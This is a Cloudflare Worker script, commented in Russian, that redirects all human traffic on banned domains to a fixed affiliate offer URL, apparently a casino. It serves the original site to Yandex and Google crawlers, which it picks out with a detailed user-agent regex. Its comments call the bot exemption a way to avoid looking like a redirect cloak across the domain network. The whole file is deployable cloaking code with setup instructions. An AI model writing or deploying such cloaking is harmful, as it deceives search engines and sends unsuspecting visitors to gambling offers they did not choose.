/**
 * Cloudflare Worker для забаненных доменов — увод всего трафика на оффер.
 *
 * Любой запрос к домену, на котором стоит этот воркер, получает 302 на один
 * фиксированный адрес. Трекер в цепочке не участвует: ни клика, ни clickid,
 * ни статистики по такому домену не будет — в панели эти переходы не появятся
 * вообще, и конверсии с них привязать будет не к чему. Для домена, который
 * уже отбанен и ничего не зарабатывает, это нормальный размен; для живого —
 * нет, живые домены ведём через worker-redirector.js.
 *
 * Роботы Яндекса и Гугла редирект не получают — им отдаётся сайт как есть.
 * Робот, которого с любой страницы (включая robots.txt) мгновенно уводит на
 * казино, — это самый явный признак редирект-клоаки, какой бывает, и видят
 * его не по одному домену: у сети общие IP, перелинковка и один шаблон.
 * Отключается флагом SKIP_BOTS ниже.
 *
 * НЕ ставить на домены, куда приходят постбеки партнёрок и где стоит панель:
 * постбек уйдёт в редирект и потеряется, а приходит он один раз.
 *
 * НАСТРОЙКА:
 *   1. Workers & Pages → Create Worker → вставить этот код → Deploy.
 *   2. Settings → Variables and Secrets → TARGET_URL = https://combospark.top/aey3zq5oyv
 *      (можно не заводить — тогда берётся значение из кода ниже).
 *   3. Settings → Domains & Routes → на каждый забаненный домен ДВА маршрута:
 *        domain.team/*
 *        *.domain.team/*
 *      Второй обязателен: сайты стоят на сабдоменах (brand.domain.team), и без
 *      звёздочки воркер поймает только сам домен, а сайты — нет.
 *
 * Сменить адрес разом на всех доменах — поменять TARGET_URL в одном месте.
 */

// Запасной адрес, если переменную не заводили.
const TARGET_URL_FALLBACK = 'https://combospark.top/aey3zq5oyv';

// false — уводить вообще всех, включая роботов.
const SKIP_BOTS = true;

// Мобильные и десктопные роботы обоих поисковиков. У Гугла мобильный робот
// ходит под тем же токеном Googlebot, у Яндекса мобильный — отдельным именем
// (YandexMobileBot), плюс все роботы Яндекса несут в UA ссылку yandex.com/bots.
//
// Проверка нарочно узкая. Ловить просто слово «yandex» нельзя: мобильное
// приложение Яндекса у живого человека шлёт UA с YandexSearch — такой посетитель
// остался бы на сайте вместо оффера.
const SEARCH_BOTS = /(yandex\.com\/bots|yandex(bot|mobilebot|images|imageresizer|video|media|blogs|news|direct|directdyn|market|pagechecker|webmaster|metrika|calendar|sitelinks|adnet|favicons|renderresourcesbot|screenshotbot|turbo|verticals|accessibilitybot|ontodb|vertis)\b|googlebot|adsbot-google|mediapartners-google|apis-google|feedfetcher-google|storebot-google|googleother|google-inspectiontool|google-extended|google-read-aloud|google-site-verification|google-safety)/i;

export default {
  async fetch(request, env) {
    // робота поисковика не уводим — отдаём сайт как есть
    if (SKIP_BOTS && SEARCH_BOTS.test(request.headers.get('user-agent') || '')) {
      return fetch(request);
    }

    let to = String((env && env.TARGET_URL) || TARGET_URL_FALLBACK).trim();

    // Кривое значение переменной не должно ронять домен в ошибку воркера:
    // лучше увести на запасной адрес, чем отдать посетителю 1101.
    try { new URL(to); } catch (e) { to = TARGET_URL_FALLBACK; }

    return Response.redirect(to, 302);
  },
};
